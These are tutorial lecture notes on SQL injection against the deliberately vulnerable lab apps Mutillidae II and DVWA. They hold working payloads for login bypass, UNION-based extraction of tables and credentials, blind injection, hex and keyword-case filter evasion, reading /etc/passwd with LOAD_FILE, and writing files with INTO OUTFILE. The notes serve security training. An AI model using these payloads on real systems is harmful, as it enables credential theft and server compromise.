<img width="1440" height="710" alt="Mutillidae Born to be Hacked" src="https://github.com/user-attachments/assets/cb14e3c4-94a6-4e34-a4ec-859a32304f4f" /> Introduction to SQL Injection

In this lecture and the next few lectures, we will learn about a very common web vulnerability called SQL Injection (SQLi).

Before learning how SQL Injection works or how to exploit it, we first need to understand what SQL and databases are.

---

 What is a Database?

Most modern websites use a database to store information.
Only very small or simple websites may not use one.

Databases are used to store:

 Usernames
 Passwords
 Blog posts
 News articles
 Images
 Comments
 Credit card details
 And almost all website data

The website communicates with the database to:

 Read data
 Insert new data
 Update existing data
 Delete data

---

 What is SQL?

SQL stands for Structured Query Language.

It is the language used by web applications to communicate with databases.

Using SQL, applications can:

 Retrieve information
 Add new records
 Modify existing records
 Delete records

---

 Understanding Databases in Practice

In this example, we log into the database installed on the Metasploitable 2 machine.

This is not hacking.
We are only exploring how databases work.

We log into MySQL:

```bash id="iq1jlwm"
mysql -u root
```

 `-u root` → login as root user
 Metasploitable has no root password (intentionally vulnerable)

---

 Viewing Databases

To see all available databases:

```sql id="suxb3e"
show databases;
```

Example databases:

 `information_schema`
 `mysql`
 `dvwa`
 `owasp10`
 `metasploit`

Each web application usually has its own database.

For example:

 DVWA uses the `dvwa` database
 OWASP WebGoat uses another database


---

 Selecting a Database

To use a specific database:

```sql id="vqv55v"
use owasp10;
```

---

 Viewing Tables

Each database contains tables.

Tables store related information.

Example:

 `accounts`
 `blogs`
 `credit_cards`

To display tables:

```sql id="ng13fm"
show tables;
```

---


 Viewing Data Inside a Table

To view all data from the `accounts` table:

```sql id="e9dnwy"
select  from accounts;
```

 `select` → retrieve data
 `` → select everything
 `from accounts` → from the accounts table

This may display:

 Usernames
 Passwords
 User IDs
 Admin status

---



 Example Output

| ID | Username | Password     | Admin |
| -- | -------- | ------------ | ----- |
| 1  | admin    | adminpass    | yes   |
| 2  | adrian   | somepassword | no    |

---

 Important Concepts

 Database

Stores website information

 Table

Stores specific categories of data

 Columns

Fields inside a table
Example:

 username
 password
 email

 SQL Queries

Commands used to interact with databases

---

 Goal of SQL Injection

Normally, only website administrators can access the database directly.

In upcoming labs, we will learn how attackers exploit SQL Injection vulnerabilities to:

 Access databases
 Read sensitive data
 Modify records
 Delete information
 Gain full database control


Why SQL Injection is Dangerous

SQL Injection (SQLi) is one of the most dangerous web vulnerabilities because it gives attackers direct access to the website’s database. Since databases store important information like usernames, passwords, emails, credit cards, and private user data, a single SQL Injection vulnerability can expose the entire application.

Many popular websites have suffered from SQL Injection vulnerabilities because they are easy to create accidentally and difficult to secure properly. In many cases, attackers do not even need a reverse shell or PHP upload because accessing the database already gives them everything they need.

An attacker can use SQL Injection to read sensitive information, modify data, create admin accounts, delete records, or sometimes even upload malicious files and gain full control over the server. This is why SQL Injection is considered one of the most critical vulnerabilities in web security.



 Discovering SQL Injection Vulnerabilities

To find SQL Injection vulnerabilities, testers usually browse through the website and try to “break” different pages. Any place that accepts user input such as login forms, search boxes, or URL parameters can potentially be vulnerable.

One common way to test for SQL Injection is by inserting special characters like a single quote:

```sql id="u0mb34"
'
```

If the application behaves strangely or shows a database error, it may indicate that the input is being processed directly inside an SQL query.

---

 Testing in Mutillidae

In OWASP Mutillidae II, first register a normal account.
For example:

 Username: `adil`
 Password: `123456`

Now try logging in again, but this time enter:

 Username: `adil`
 Password:

```sql id="kpy38v"
'
```

This produces a database error, which is very useful because it reveals part of the SQL query being executed.

Usually in real-world applications, detailed database errors are hidden, but for learning purposes this helps us understand how SQL Injection works.

<img width="1438" height="329" alt="Screenshot 2026-05-09 at 7 55 18 AM" src="https://github.com/user-attachments/assets/5cd919d0-7713-4004-84ec-d1c85409fdd3" />

---

The query becomes something like:

```sql id="bbawzk"
SELECT  FROM accounts 
WHERE username='adil' 
AND password=''';
```

The extra quote breaks the SQL query and causes an error.

---

 Bypassing Login as Admin

Now suppose we want to log in as admin without knowing the password.

The normal query looks like:

```sql id="q8pbt6"
SELECT  FROM accounts 
WHERE username='admin' 
AND password='password';
```

We can manipulate the password field using:

```sql id="mlv3x7"
12' OR 1=1
```

The query now becomes:

```sql id="73p7gi"
SELECT  FROM accounts 
WHERE username='admin' 
AND password='12' OR 1=1;
```

Since `1=1` is always true, the login condition becomes true and authentication is bypassed.

<img width="1440" height="493" alt="PHP Scripts Of OWASP Top" src="https://github.com/user-attachments/assets/ecf40a16-2e31-4daf-906a-21ddc9983d5f" />


---

 Another Login Bypass Method

We can also inject directly into the username field:

```sql id="q8fg5m"
admin' 
```

The query becomes:

```sql id="aq2sh2"
SELECT  FROM accounts 
WHERE username='admin'' 
AND password='';
```

Everything after `` becomes a comment, so the password check is ignored completely.

<img width="1440" height="562" alt="Screenshot 2026-05-09 at 8 08 30 AM" src="https://github.com/user-attachments/assets/41b0ada3-9502-4413-93d1-b49360f8d2b2" />


---

 SQL Injection at Security Level 1

Now increase the security level from `0` to `1`.

When trying the same payload directly in the browser, the request gets blocked and nothing appears in Burp Suite.

This happens because the filtering is occurring on the client side.

---

 Client-Side Request

A client-side request means the filtering happens inside the browser before the data is sent to the server.

Example payload:

```sql id="u25gpk"
' OR 1=1
```

The browser detects dangerous characters like:

 `'`
 ``

and blocks the request immediately.

Flow:

```text id="vyjlwm"
Browser → Blocked → Server never receives request
```

---

 Server-Side Request

A server-side request means the data reaches the server first, and then the server checks it.

Flow:

```text id="jlwm7k"
Browser → Server → Input checked
```

Server-side filtering is much stronger because attackers cannot bypass it easily using browser tricks.

---

 Using Burp Suite to Bypass Client-Side Filtering

If we enter a normal username and password, the request successfully appears inside Burp Suite.

Example:

 Username: `admin`
 Password: `aaa`

<img width="1440" height="675" alt="Screenshot 2026-05-09 at 8 17 49 AM" src="https://github.com/user-attachments/assets/9565d3f7-2bc3-4b87-a2b5-dd223a6cbfb8" />


---

Since the request already bypassed the browser filter, we can now modify it manually inside Burp Suite.

Change the username to:

```sql id="rd4bz5"
admin' 
```

Then forward the request.

The server processes the modified SQL query and the login is bypassed successfully.

<img width="1439" height="770" alt="Screenshot 2026-05-09 at 8 18 37 AM" src="https://github.com/user-attachments/assets/59c9bdc7-96f6-4505-a949-91a05b3e1818" />


<img width="1078" height="37" alt="Screenshot 2026-05-09 at 8 21 44 AM" src="https://github.com/user-attachments/assets/ddc9934b-8399-4e4e-b224-4b9945400548" />

<img width="1416" height="429" alt="Mutillidae Born to be Hacked" src="https://github.com/user-attachments/assets/97da232c-4b5c-450b-864a-fe55f0e4a552" />

---

 SQL Injection – High Security Level

At High security level, the same SQL Injection payload no longer works, even when using Burp Suite.

Payload:

```sql id="ie3rt7"
' OR 1=1
```

Result:

```text id="jlwm9x"
Bad username or password
```



 Why the Attack Fails

At low and medium levels, the application used queries like:

```php id="u0a9w1"
SELECT  FROM accounts 
WHERE username='$username' 
AND password='$password';
```

This directly inserted user input into the SQL query, making it vulnerable.

---

 What High Security Changes

The high security version uses a function similar to:

```php id="jlwm3z"
mysqli_real_escape_string()
```

This function escapes or removes dangerous characters such as:

 `'`
 `"`
 special characters

So a payload like:

```sql id="jlwm4v"
admin'
```

gets treated as normal text instead of executable SQL code.

The application also hardcodes quotes around the input:

```php id="jlwm5n"
WHERE username='$username'
```

Because of this:

 Everything inside the quotes becomes a string
 Injected SQL code is not executed

---

 Key Takeaway

 Low security → vulnerable to direct SQL Injection
 Medium security → uses weak client-side filtering
 High security → escapes dangerous characters and blocks injection attempts

This is why proper input handling and secure coding are important in web applications.



{{ Discovering SQL Injection Through URL Parameters (GET Method) }}

In this example, we are testing for an SQL Injection vulnerability on a page that displays user information.

Previously, the injection was performed through a login form using the POST method. This time, the application passes user input directly through the URL using the GET method.

Example:

```text id="4zjlwm"
userinfo.php?username=adil&password=123456
```

Here, the username and password are visible in the URL, which means we can directly modify them and test for SQL Injection.

<img width="1440" height="689" alt="Screenshot 2026-05-12 at 7 41 49 AM" src="https://github.com/user-attachments/assets/cca75684-d097-4382-9e63-452cc2bf8357" />

<img width="1428" height="705" alt="Mutillidae Born to be Hacked" src="https://github.com/user-attachments/assets/151400be-7245-4633-8610-a933ec5f94be" />

---

Example full URL:

```text id="jlwm1a"
http://172.16.219.181/mutillidae/index.php?page=user-info.php&username=adil&password=123456&user-info-php-submit-button=View+Account+Details
```

During penetration testing, whenever you see parameters like:

```text id="jlwm2b"
page.php?id=2
```

or

```text id="jlwm3c"
news.php?id=5
```

you should always test them because the application may be using those values directly inside SQL queries.

The backend query in this case is similar to:

```sql id="jlwm4d"
SELECT  FROM accounts 
WHERE username='adil' 
AND password='123456';
```

---

Testing with ORDER BY

To test the vulnerability, SQL code is injected into the username parameter using an `ORDER BY` statement.

Payload:

```sql id="jlwm5e"
adil' ORDER BY 1
```

What happens here:

 `'` closes the original username string
 `ORDER BY 1` sorts results using the first column
 `` comments out the rest of the query

The final SQL query becomes:

```sql id="jlwm6f"
SELECT  FROM accounts 
WHERE username='adil' ORDER BY 1'
AND password='123456';
```

Since everything after `` is ignored, the injected SQL executes successfully.

If the page loads normally, it means the SQL query accepted our injection.

<img width="1440" height="710" alt="Mutillidae Born to be Hacked" src="https://github.com/user-attachments/assets/66ca7036-3d25-4d10-a4a2-9653855d9455" />

---

 Confirming the Vulnerability

Next, a very large column number is tested:

```sql id="jlwm7g"
adil' ORDER BY 100000
```

Because the table does not have 100000 columns, the database returns an error such as:

```text id="jlwm8h"
Unknown column '100000'
```

This confirms that:

 Our SQL code is being executed
 The query is being modified successfully
 The application is vulnerable to SQL Injection

<img width="1438" height="880" alt="Screenshot 2026-05-12 at 7 48 41 AM" src="https://github.com/user-attachments/assets/75059b04-c102-4119-b6dd-d975b91781ac" />



If changing injected SQL statements changes the database response or produces database errors, the application is likely vulnerable to SQL Injection.


{{ Finding the Number of Columns in SQL Injection }} 

Now that we confirmed the page is vulnerable to SQL Injection, the next step is finding out how many columns are being used in the SQL query.

To do that, we use the `ORDER BY` statement.

We already know:

```sql id="jlwm1q"
ORDER BY 1
```

worked successfully, while:

```sql id="jlwm2w"
ORDER BY 100000
```

returned an error.

So we continue testing different numbers:

```sql id="jlwm3e"
ORDER BY 5
```

✅ Works normally

```sql id="jlwm4r"
ORDER BY 6
```

❌ Returns an error

This tells us the query is selecting exactly 5 columns.
Anything higher than 5 causes an error because that column does not exist.

---

 Using UNION SELECT

Now that we know the number of columns, we can create our own query using `UNION SELECT`.

The original query looks something like:

```sql id="jlwm5t"
SELECT  FROM accounts 
WHERE username='adil';
```

We inject:

```sql id="jlwm6y"
' UNION SELECT 1,2,3,4,5
```

Here:

 `UNION SELECT` combines our results with the original query
 We provide 5 values because the original query has 5 columns
 `` comments out the remaining part of the SQL query

<img width="1440" height="863" alt="Screenshot 2026-05-12 at 7 58 50 AM" src="https://github.com/user-attachments/assets/04377012-ca6f-4253-9ea9-807d59dae6f8" />

---

When executed, the webpage displays some of the numbers like `2`, `3`, and `4`.

This helps identify which columns are visible on the webpage.

Example:

 Column `2` appears in the First Name field
 Column `3` appears in the Surname field
 Column `4` appears in the Signature field

---

 Extracting Database Information

Instead of displaying numbers, we can use useful SQL functions:

```sql id="jlwm7u"
' UNION SELECT 1,database(),user(),version(),5
```

This retrieves:

 `database()` → current database name
 `user()` → current database user
 `version()` → MySQL version

The results showed:

 Current database: `owasp10`
 Current user: `root@localhost`
 MySQL version: `5.0.51`

<img width="1440" height="876" alt="Mutillidae Born to be Hacked" src="https://github.com/user-attachments/assets/cbeddab5-1799-4c25-b808-7afad0bdb064" />


---

 What This Means

This tells us:

 The application is connected to the `owasp10` database
 The website is using the MySQL `root` account
 We can now start extracting tables, columns, and sensitive data from the database

In real-world applications, websites usually use limited database accounts instead of the root user. This helps restrict access only to the website’s own database and improves security.


{{ Discovering Database Tables with SQL Injection }}

Now that we know the current database is called `owasp10`, the next step is to discover the tables inside that database.

To do this, we use `UNION SELECT` again, but this time we query MySQL’s internal database called `information_schema`.

`information_schema` is a default MySQL database that stores metadata about:

 databases
 tables
 columns

The injection used is:

```sql id="jlwm1m"
adil' UNION SELECT null,table_name,null,null,null 
FROM information_schema.tables %23
```

Here:

 `table_name` retrieves the table names
 `information_schema.tables` contains information about all tables
 `NULL` is used for unused columns because the original query has 5 columns
 `%23` is the URL-encoded version of `` used for comments

<img width="1440" height="900" alt="Screenshot 2026-05-12 at 8 08 27 AM" src="https://github.com/user-attachments/assets/2bdfa630-c0e9-4aeb-a4d0-c52e54ebefa1" />

---

When executed, the page returns many table names — around 237 results.

This happens because the database user is `root`, which has permission to view tables from multiple databases on the server.

In real-world applications, websites usually use limited database accounts, so attackers normally only see tables belonging to the current database.

---

 Filtering Tables from the Current Database

To display only tables from the `owasp10` database, we add a `WHERE` clause:

```sql id="jlwm2n"
adil' UNION SELECT null,table_name,null,null,null 
FROM information_schema.tables 
WHERE table_schema='owasp10'%23
```

Now the results only show tables belonging to the `owasp10` database, such as:

 `accounts`
 `blogs_table`
 `credit_cards`
 `hitlog`
 `pentest_tools`

<img width="1440" height="836" alt="Screenshot 2026-05-12 at 8 20 57 AM" src="https://github.com/user-attachments/assets/fa0043ed-7e91-490b-bf4a-78924d6faae3" />

---

 What We Achieved

At this point, we successfully enumerated the database structure and discovered the available tables inside the target database.

These tables can later be targeted to extract sensitive information such as:

 usernames
 passwords
 credit card data
 application information

{{  Discovering Column Names with SQL Injection }}

Now that we discovered the `accounts` table, the next step is to find the column names inside that table.

We need the column names because SQL queries work like this:

```sql id="jlwm1k"
SELECT column_name FROM table_name;
```

At this stage, we already know the table name (`accounts`), but we still do not know its columns.

To discover them, we query MySQL’s metadata database again using `information_schema.columns`.

The injection becomes:

```sql id="jlwm2l"
adil' UNION SELECT null,column_name,null,null,null 
FROM information_schema.columns 
WHERE table_name='accounts'
```

Here:

 `column_name` retrieves the names of columns
 `information_schema.columns` stores information about all columns
 `WHERE table_name='accounts'` filters results to only the `accounts` table

When executed, the page returns column names such as:

 `id`
 `username`
 `password`
 `mysignature`
 `isadmin`

<img width="1440" height="871" alt="Screenshot 2026-05-12 at 9 28 01 AM" src="https://github.com/user-attachments/assets/03cc9c83-7eae-4bd9-8e46-0a2d4cbbfb15" />


---

 Extracting Sensitive Data

Now that we know the column names, we can directly retrieve data from the `accounts` table itself.

The next payload is:

```sql id="jlwm3m"
' UNION SELECT NULL,username,password,isadmin,NULL 
FROM accounts
```

This query retrieves:

 usernames
 passwords
 admin status

The values are placed in columns `2`, `3`, and `4` because earlier testing showed those columns are visible on the webpage.

When executed, the page displays all usernames and passwords stored in the database, including administrator accounts.

Example results:

 `admin : adminpass`
 other usernames and passwords
 whether the account has admin privileges

<img width="1438" height="864" alt="Screenshot 2026-05-12 at 9 30 07 AM" src="https://github.com/user-attachments/assets/636379df-52af-48ba-9bd9-6e7ec0b2202c" />


---

 Why This Is Dangerous

An attacker can now use these valid credentials to log in directly to the website as normal users or administrators.

This demonstrates how severe SQL Injection vulnerabilities can become when sensitive data is exposed.

---

 SQL Injection Process Summary

The general process followed during SQL Injection testing is:

1. Find the number of columns
2. Identify visible columns
3. Enumerate database tables
4. Enumerate column names
5. Extract sensitive data directly from the database

--


{{  Blind SQL Injection  }}

A Blind SQL Injection is a type of SQL Injection vulnerability where the website does not display database errors directly.

In a normal SQL Injection, entering something like:

```sql id="jlwm1b"
'
```

may immediately produce an SQL error on the page, confirming the vulnerability.

But in a Blind SQL Injection:

 no SQL errors are displayed
 the page may still be vulnerable
 we detect it by observing how the page behaves

Instead of relying on errors, we inject:

 a true condition
 and a false condition

Then we compare the responses.

---

 Testing with True and False Conditions

Suppose the normal request is:

```text id="jlwm2c"
id=1
```

The page displays valid user information.

Now inject a true condition:

```sql id="jlwm3d"
1' AND 1=1
```

Since `1=1` is true, the query remains valid and the page still behaves normally.

---

<img width="1437" height="597" alt="Screenshot 2026-05-18 at 10 27 25 AM" src="https://github.com/user-attachments/assets/3d74b848-ae68-4608-9359-7770ec93426c" />

<img width="1439" height="715" alt="Screenshot 2026-05-18 at 10 29 56 AM" src="https://github.com/user-attachments/assets/a467be25-c009-4760-8886-d6b1387a4353" />



---

Next, inject a false condition:

```sql id="jlwm4e"
1' AND 1=0
```

Because `1=0` is false, the query returns no matching results, so the page behaves differently or becomes blank.

<img width="1440" height="417" alt="Screenshot 2026-05-18 at 10 30 20 AM" src="https://github.com/user-attachments/assets/fcc1c38c-6131-4935-8a5a-eb5fabd141d9" />


---

Even though no SQL error is shown, the difference in behavior confirms that the SQL query is being manipulated.

---

 Using ORDER BY in Blind SQL Injection

Another common testing method uses `ORDER BY`.

Example that works:

```sql id="jlwm5f"
1' ORDER BY 1
```

This works because column `1` exists.

Now test a very large column number:

```sql id="jlwm6g"
1' ORDER BY 10000
```

Since column `10000` does not exist, the page behaves abnormally.

This again confirms the presence of a Blind SQL Injection vulnerability.


---

 Exploiting Blind SQL Injection

Once the vulnerability is confirmed, exploitation is almost the same as normal SQL Injection. as we check that by using order by 2 it give you answer on the screen but when you order by 3 in the query no response on the page that means this has 2 columns so we can use the query union select 1,2 to find the table names 

Example:

```sql id="jlwm7h"
1' UNION SELECT 1,2
```

<img width="1440" height="537" alt="Screenshot 2026-05-18 at 10 31 38 AM" src="https://github.com/user-attachments/assets/e44d8776-5bef-47f0-b967-f37a0ef1a05a" />


---

Or retrieving table names:

```sql id="jlwm8i"
1' UNION SELECT table_name,NULL 
FROM information_schema.tables
```

<img width="1439" height="857" alt="Screenshot 2026-05-18 at 10 34 43 AM" src="https://github.com/user-attachments/assets/9252d171-eb5f-4f50-a900-6f46726019d0" />

---

 Difference Between Normal and Blind SQL Injection

| Normal SQL Injection           | Blind SQL Injection                     |
| ------------------------------ | --------------------------------------- |
| Shows database errors directly | Does not show SQL errors                |
| Easier to identify             | Requires observing page behavior        |
| Errors confirm injection       | True/false conditions confirm injection |

---

 Key Takeaway

Experienced penetration testers usually test applications as if they are blind from the beginning instead of relying only on visible SQL errors. Even if no database error appears, differences in page behavior can still reveal SQL Injection vulnerabilities.



{{ Discovering complex SQL Injection in DVWA }}

Now that we already learned how to extract data using SQL Injection in OWASP Mutillidae II, we will try the same technique in DVWA (Damn Vulnerable Web Application).

---

 Low Security Level

Go to:

 DVWA → SQL Injection
 Set Security Level → Low

Enter:

```sql
1
```

The page displays valid user information such as first name and surname.

<img width="1437" height="632" alt="Screenshot 2026-05-19 at 10 35 57 AM" src="https://github.com/user-attachments/assets/76da0cba-b48f-44bc-88c7-e60572c59d02" />


---

 Testing for SQL Injection

Now add a single quote:

```sql
1'
```

This produces an SQL error, confirming that the page is vulnerable to SQL Injection.

We can test further using a true condition:

```sql
1' AND 1=1
```

Since `1=1` is true, the page still works normally.

Now test a false condition:

```sql
1' AND 1=0
```

Since `1=0` is false, the page becomes blank or invalid.

This confirms that the SQL query is injectable.

<img width="1440" height="508" alt="Screenshot 2026-05-19 at 10 36 34 AM" src="https://github.com/user-attachments/assets/b4a90f59-daa3-428c-a458-ba7ede063c23" />


---

 Finding the Number of Columns

Next, use `ORDER BY` to determine the number of columns used in the query.

Test:

```sql
1' ORDER BY 3
```

This returns an error.

Now test:

```sql
1' ORDER BY 2
```

This works successfully.

That means the query contains exactly 2 columns.

<img width="1440" height="667" alt="Screenshot 2026-05-19 at 10 36 50 AM" src="https://github.com/user-attachments/assets/c7160ddf-ab36-418b-8c4f-cc2f8742549c" />


---

 Using UNION SELECT

Now we can build a UNION SELECT query:

```sql
1' UNION SELECT 1,2
```

The page displays values from both columns, confirming successful injection.

Next, retrieve the current database name:

```sql
1' UNION SELECT database(),2
```

Result:

```sql
dvwa
```

<img width="1440" height="550" alt="Screenshot 2026-05-19 at 10 37 46 AM" src="https://github.com/user-attachments/assets/0e9baa7c-5996-42ab-94b8-487894dde7c1" />


---

 Enumerating Tables

Now retrieve table names from `information_schema.tables`:

```sql
1' UNION SELECT table_name,2
FROM information_schema.tables
WHERE table_schema='dvwa'
```

This returns tables such as:

 guestbook
 users

<img width="1440" height="690" alt="Screenshot 2026-05-19 at 10 39 06 AM" src="https://github.com/user-attachments/assets/7d06034e-042d-4804-b7dd-03c5f4946d0b" />


---

 Extracting Column Names

Now we need to identify the column names inside the `users` table.

```sql
1' UNION SELECT column_name,2
FROM information_schema.columns
WHERE table_name='users'
```

This displays columns such as:

 user
 password
 first_name
 last_name

<img width="1437" height="722" alt="Screenshot 2026-05-19 at 10 39 47 AM" src="https://github.com/user-attachments/assets/ff4f27ba-5d1a-4669-93a3-4d4d0bba0ad5" />


---

 Extracting Usernames and Passwords

Now retrieve usernames and password hashes:

```sql
1' UNION SELECT user,password
FROM users
```

The page displays usernames and password hashes stored in the database.

<img width="1440" height="695" alt="Screenshot 2026-05-19 at 10 40 15 AM" src="https://github.com/user-attachments/assets/c6df8309-c2ce-4548-92d6-6c509929addd" />

---

 SQL Injection – Medium Security

Now change DVWA Security Level to:

```text
Medium
```

At first, the previous payloads appear to fail.

Example:

```sql
1' AND 1=1
```

Instead of working, the page shows an error related to the quote character.

<img width="1440" height="398" alt="Screenshot 2026-05-19 at 10 44 34 AM" src="https://github.com/user-attachments/assets/f11f64fe-9123-4c30-b808-459254d2086a" />


Even URL-encoding the quote:

```text
%27
```

still fails.

---

 Bypassing Medium Security

After testing different payloads, we discover that the application becomes injectable without using quotes.

This payload works:

```sql
1 AND 1=1
```

This payload fails:

```sql
1 AND 1=0
```

This confirms the page is still vulnerable to SQL Injection.

<img width="1440" height="658" alt="Screenshot 2026-05-19 at 10 45 14 AM" src="https://github.com/user-attachments/assets/a60e3c95-9cca-438e-a129-7df355bcda1e" />


---

 UNION SELECT Without Quotes

Now continue exploitation normally.

Test:

```sql
1 UNION SELECT 1,2
```

Then retrieve table names:

```sql
1 UNION SELECT table_name,2
FROM information_schema.tables
```

The application successfully returns database tables again.


{{ SQL Injection in DVWA – Medium Security Bypass Using HEX }} 

Previously, we successfully extracted all tables from the database.
Now we want to filter the results and display only the tables that belong to the `dvwa` database.

The normal query is:

```sql id="8c56lc"
1 UNION SELECT table_name,2
FROM information_schema.tables
WHERE table_schema='dvwa'
```

But at Medium Security, DVWA blocks quotation marks (`'`), so this payload fails.



---

 Why It Fails

The application filters special characters like:

```text id="93zvfk"
'
"
```

Even URL encoding the quote:

```text id="glx20p"
%27
```

still gets blocked.

So we need another way to write:

```text id="bd6vl8"
dvwa
```

without using quotes.

---

 Using Burp Suite Decoder

To bypass this restriction, we can convert the database name into HEX format using Burp Suite Decoder.

Open:

```text id="84zh44"
Burp Suite → Decoder
```

Type:

```text id="9hduw6"
dvwa
```

Then choose:

```text id="jq7q40"
Encode as → Hex
```

The HEX value becomes:

```text id="xumhzq"
64767761
```


---

 Using HEX in SQL Injection

In MySQL, HEX values start with:

```text id="0esvxb"
0x
```

So instead of:

```sql id="tdx8n4"
'dvwa'
```

we use:

```sql id="xyk2w6"
0x64767761
```

Now the payload becomes:

```sql id="m24f8u"
1 UNION SELECT table_name,2
FROM information_schema.tables
WHERE table_schema=0x64767761
```

Notice:

 No quotes are used
 The database name is written in HEX
 This bypasses the filter

<img width="1440" height="650" alt="Screenshot 2026-05-26 at 11 33 27 AM" src="https://github.com/user-attachments/assets/44f6ef96-bb0b-451b-a466-f4a6f69789f2" />



 Result

The application now returns only tables from the DVWA database, such as:

 guestbook
 users

This confirms the SQL Injection still works at Medium Security.


 Important Concept

When quotes are blocked:

 Convert text into HEX
 Use `0x` before the HEX value
 Avoid using quotes completely

This technique is commonly used to bypass weak SQL Injection filters.

_______________


 SQL Injection Tips & Tricks

While testing for SQL Injection, some websites try to block common SQL keywords using blacklists. They may check for words such as:

```text
AND
UNION
SELECT
ORDER BY
spaces
comments
```

If any of these keywords are detected, the website may block the request. Fortunately, weak blacklist filters can often be bypassed.

---

 Bypassing Keyword Filters

SQL keywords are case-insensitive, meaning MySQL treats uppercase and lowercase letters the same.

For example, instead of:

```sql
AND 1=1
```

you can use:

```sql
aNd 1=1
```

or:

```sql
AnD 111=111
```

Similarly, instead of:

```sql
ORDER BY 1
```

you can write:

```sql
orDeR bY 1
```

The query will still execute successfully even if the website blacklists the exact keyword.


---

 TRUE Statements for Discovering SQL Injection

These payloads usually return a valid page:

```sql
aNd 1=1
```

```sql
aNd 21=21
```

```sql
orDeR bY 1
```


---

 FALSE Statements

These payloads usually return an invalid page or generate a different response:

```sql
aNd 0=1
```

```sql
anD 9=2
```

```sql
ordEr bY 1000000000000
```


---

 Replacing Spaces

Some applications block spaces inside URLs.

Normally:

```sql
orDeR bY 1
```

You can replace spaces with:

```text
+
//
%20
```

Examples:

```sql
orDeR+bY+1
```

```sql
orDeR//bY//1
```

```sql
orDeR%20bY%201
```

All three perform the same function.


---

 UNION SELECT Without Spaces

A normal query:

```sql
UNION SELECT 1,2
```

can be rewritten as:

```sql
uNIoN+sElEcT+1,2
```

or:

```sql
uNIoN//sElEcT//1,2
```

This helps bypass filters that block spaces or exact keywords.


---

 SQL Comments

Comments are used to ignore the rest of the SQL query.

Common comment styles include:

```text

%23
--
/
//
```

Examples:

```sql
aNd 1=1
```

```sql
aNd 1=1--
```

```sql
aNd 1=1/
```

Sometimes you may need to terminate the SQL statement first using a semicolon:

```sql
aNd 1=1;//
```

```sql
aNd 1=1;
```


---

 Quick Reference

 TRUE Statements

```sql
aNd 1=1
aNd 21=21
orDeR bY 1
```

 FALSE Statements

```sql
aNd 0=1
anD 9=2
ordEr bY 1000000000000
```

 Space Replacements

```text
+
//
%20
```

 Comment Characters

```text

%23
--
/
//
```

 Sometimes Required

```sql
aNd 1=1;//
aNd 1=1;
```


Blacklist-based filtering is weak because attackers can often bypass it using:

 Mixed uppercase and lowercase letters
 Alternative space characters
 Different comment styles
 Encoded characters

Think of it like a list of names:

| Position | Table Name |
| -------- | ---------- |
| 0        | guestbook  |
| 1        | users      |
| 2        | accounts   |
| 3        | logs       |

Normally, this query:

```sql
UNION SELECT table_name FROM information_schema.tables
```

returns all table names.

Output:

```text
guestbook
users
accounts
logs
```

 The Problem

Some websites are coded to display only one result.

So instead of showing:

```text
guestbook
users
accounts
logs
```

they only show:

```text
guestbook
```

Even though the database returned all records.

---

 The Solution: LIMIT

We tell SQL exactly which record we want.

 First table

```sql
UNION SELECT table_name
FROM information_schema.tables
LIMIT 0,1
```

Meaning:

 Start at record 0
 Show 1 record

Output:

```text
guestbook
```

---

 Second table

```sql
UNION SELECT table_name
FROM information_schema.tables
LIMIT 1,1
```

Meaning:

 Start at record 1
 Show 1 record

Output:

```text
users
```

---

 Third table

```sql
UNION SELECT table_name
FROM information_schema.tables
LIMIT 2,1
```

Output:

```text
accounts
```

---

 Simple Analogy

Imagine a book with 100 pages, but someone only lets you see one page at a time.

You can still read the whole book by saying:

 Show page 0
 Show page 1
 Show page 2
 Show page 3

and so on.

`LIMIT` does exactly that with database records.

---

 What `LIMIT 0,1` means

```sql
LIMIT start_position, number_of_records
```

Examples:

```sql
LIMIT 0,1
```

= Start at record 0 and show 1 record.

```sql
LIMIT 5,1
```

= Start at record 5 and show 1 record.

```sql
LIMIT 5,3
```

= Start at record 5 and show 3 records.

---

So in this lecture, the attacker already had a SQL injection and could retrieve table names. The challenge was that the webpage displayed only one row. Using `LIMIT`, they manually viewed table names one at a time by changing:

```sql
LIMIT 0,1
LIMIT 1,1
LIMIT 2,1
LIMIT 3,1
```

until they discovered all the tables.



@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@

 Reading Files Using SQL Injection

Now let's see how SQL Injection can be used to read files from the server.

This are the scripts we are using in this exercise 

<img width="646" height="262" alt="Screenshot 2026-06-23 at 4 40 16 PM" src="https://github.com/user-attachments/assets/ff575b4d-1b7a-4f7e-889d-fe62d6afed44" />


We already know that the application is vulnerable to SQL Injection and that column 2 is displayed on the webpage. We can use MySQL's `LOAD_FILE()` function to read files from the operating system.

Use the following payload:

```sql
' UNION SELECT NULL,LOAD_FILE('/etc/passwd'),NULL,NULL,NULL
```

Here:

 `LOAD_FILE()` reads the specified file.
 `/etc/passwd` is a common Linux file containing user account information.
 The output will be displayed in column 2.

After executing the payload, the contents of `/etc/passwd` are displayed on the page.

<img width="1440" height="891" alt="Screenshot 2026-06-23 at 4 21 27 PM" src="https://github.com/user-attachments/assets/3f61b7f7-1a84-4dfa-9cb7-da9cd0fb7a59" />


This confirms that the database user has permission to read files from the server.

---

 Writing Files Using SQL Injection

Now let's see if we can write files to the target system.

We will use MySQL's `INTO OUTFILE` statement.

Use the following payload:

```sql
' UNION SELECT
'example example',
NULL,NULL,NULL,NULL
INTO OUTFILE '/var/www/html/example.txt'
```

The goal is to create a file called `example.txt` inside the web server directory.

After executing the payload, MySQL returns an error.

<img width="1440" height="887" alt="Screenshot 2026-06-23 at 4 27 10 PM" src="https://github.com/user-attachments/assets/afc36ca8-3cf8-4632-8438-98dc033278ef" />


The error indicates that MySQL does not have permission to write to the web root directory.

---

 Trying a Writable Directory

Instead of writing to the web root, let's try writing to the temporary directory.

Use:

```sql
' UNION SELECT
'example example',
NULL,NULL,NULL,NULL
INTO OUTFILE '/tmp/example.txt'
```

This time the query executes successfully.


Now verify the file on the target system:

```bash
ls -la /tmp
```

We can see the newly created file:

```bash
example.txt
```


To view its contents:

```bash
cat /tmp/example.txt
```

Output:

```text
example example
```

<img width="1440" height="387" alt="Screenshot 2026-06-23 at 4 34 22 PM" src="https://github.com/user-attachments/assets/a3333278-5533-4caa-a150-b463dafc7de6" />


 Result

We successfully:

 Read operating system files using `LOAD_FILE()`
 Created a file on the server using `INTO OUTFILE`



________________________________________


 Combining SQL Injection and Local File Inclusion (LFI)

In this exercise, we explored how multiple vulnerabilities can be chained together to increase their overall impact. While each vulnerability may appear limited when exploited independently, combining them can lead to significantly more severe consequences.

 Step 1: Writing a File Through SQL Injection

